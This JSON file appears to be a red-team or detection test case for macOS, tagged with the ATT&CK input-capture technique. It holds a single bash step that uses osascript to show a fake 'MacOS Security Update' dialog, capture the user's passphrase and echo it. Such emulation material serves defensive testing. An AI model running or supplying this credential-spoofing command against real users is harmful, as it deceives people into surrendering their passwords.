{
  "id": "b7037b89-947a-427a-ba29-e7e9f09bc045",
  "name": "AppleScript - Spoofing a credential prompt using osascript",
  "description": "Prompt user for password without requiring permissions to send Apple events to System Settings.\nhttps://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/\n",
  "platforms": [
    "darwin"
  ],
  "steps": [
    {
      "id": "f123b0ee-bf90-4fcb-8291-cfd68760366c",
      "type": "execute-command",
      "data": {
        "command": "PWD_SPOOF=$(osascript -e 'display dialog \"To perform a security update MacOS needs your passphrase.\" with title \"MacOS Security Update\" default answer \"\" with icon stop with hidden answer')\necho $PWD_SPOOF\n",
        "command_type": "bash"
      },
      "elevation_required": false
    }
  ],
  "tags": [
    "T1056",
    "T1056.002"
  ]
}